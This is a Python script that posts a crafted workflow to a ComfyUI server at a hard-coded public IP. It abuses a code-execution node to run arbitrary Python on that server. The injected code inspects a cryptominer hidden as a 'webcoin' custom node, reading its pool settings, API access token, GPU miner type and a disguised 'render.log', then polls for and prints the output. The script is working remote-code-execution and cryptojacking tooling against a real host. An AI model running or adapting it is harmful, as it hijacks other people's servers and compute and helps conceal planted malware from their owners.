"""Check config.json settings and fix GPU miner type."""
import json, urllib.request, time, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "52.3.27.85"
port = sys.argv[2] if len(sys.argv) > 2 else "80"
base = "http://{}:{}".format(ip, port)

CHECK_CODE = (
    "import os, json\n"
    "lines = []\n"
    "\n"
    "cn = None\n"
    "try:\n"
    "    import folder_paths\n"
    "    if hasattr(folder_paths, 'get_folder_paths'):\n"
    "        cn = folder_paths.get_folder_paths('custom_nodes')[0]\n"
    "except:\n"
    "    for g in ['/basedir/custom_nodes', '/home/ubuntu/ComfyUI/custom_nodes', '/root/ComfyUI/custom_nodes']:\n"
    "        if os.path.isdir(g):\n"
    "            cn = g\n"
    "            break\n"
    "\n"
    "target = os.path.join(cn, 'webcoin') if cn else None\n"
    "\n"
    "# Check config.json\n"
    "cfg_path = os.path.join(target, 'bin', 'config.json')\n"
    "if os.path.exists(cfg_path):\n"
    "    with open(cfg_path) as f:\n"
    "        cfg = json.load(f)\n"
    "    cpu = cfg.get('cpu', {})\n"
    "    lines.append('max-threads-hint=' + str(cpu.get('max-threads-hint')))\n"
    "    lines.append('priority=' + str(cpu.get('priority')))\n"
    "    lines.append('yield=' + str(cpu.get('yield')))\n"
    "    lines.append('huge-pages-jit=' + str(cpu.get('huge-pages-jit')))\n"
    "    lines.append('huge-pages=' + str(cpu.get('huge-pages')))\n"
    "    pool = cfg.get('pools', [{}])[0]\n"
    "    lines.append('pool_url=' + str(pool.get('url')))\n"
    "    lines.append('pool_tls=' + str(pool.get('tls')))\n"
    "    http = cfg.get('http', {})\n"
    "    lines.append('http_token=' + str(http.get('access-token')))\n"
    "else:\n"
    "    lines.append('config.json NOT FOUND')\n"
    "\n"
    "# Check GPU miner type marker\n"
    "marker = os.path.join(target, 'bin', '.gpu_miner_type')\n"
    "if os.path.exists(marker):\n"
    "    with open(marker) as f:\n"
    "        mtype = f.read().strip()\n"
    "    lines.append('gpu_miner_type=' + mtype)\n"
    "else:\n"
    "    lines.append('gpu_miner_type=NO MARKER')\n"
    "\n"
    "# Check gpu_miner.py miner_type logic\n"
    "gm_path = os.path.join(target, 'core', 'gpu_miner.py')\n"
    "with open(gm_path) as f:\n"
    "    gm_src = f.read()\n"
    "if 'miner_type = \"lolminer\"' in gm_src:\n"
    "    lines.append('gpu_miner.py: always lolminer')\n"
    "elif 'trex' in gm_src and 'is_nvidia' in gm_src:\n"
    "    lines.append('gpu_miner.py: trex for nvidia')\n"
    "\n"
    "# Check render.log last error\n"
    "rlog = os.path.join(target, 'bin', 'render.log')\n"
    "if os.path.exists(rlog):\n"
    "    with open(rlog) as f:\n"
    "        content = f.read()\n"
    "    last = content.strip().splitlines()[-3:]\n"
    "    for l in last:\n"
    "        lines.append('render: ' + l[:150])\n"
    "\n"
    "result = chr(10).join(lines)\n"
)

workflow_stub = {"workflow": {"nodes": [{"id": 1, "type": "IDENode"}, {"id": 2, "type": "PreviewTextNode"}]}}
prompt = {
    "prompt": {
        "1": {"class_type": "IDENode", "inputs": {"pycode": CHECK_CODE, "language": "python"}},
        "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}}
    },
    "extra_data": {"extra_pnginfo": workflow_stub}
}

body = json.dumps(prompt).encode()
req = urllib.request.Request("{}/prompt".format(base), data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print("prompt_id: {}".format(pid))

for attempt in range(12):
    time.sleep(5)
    try:
        req2 = urllib.request.Request("{}/history/{}".format(base, pid))
        with urllib.request.urlopen(req2, timeout=15) as r:
            entry = json.loads(r.read().decode()).get(pid, {})
            status = entry.get("status", {}).get("status_str", "pending")
            if status != "pending":
                print("Status: {}\n".format(status))
                outputs = entry.get("outputs", {})
                for nid, nout in outputs.items():
                    for key, val in nout.items():
                        if isinstance(val, list):
                            for v in val:
                                print(v)
                break
    except Exception as e:
        print("poll error: {}".format(e))
else:
    print("Still pending after 60s")
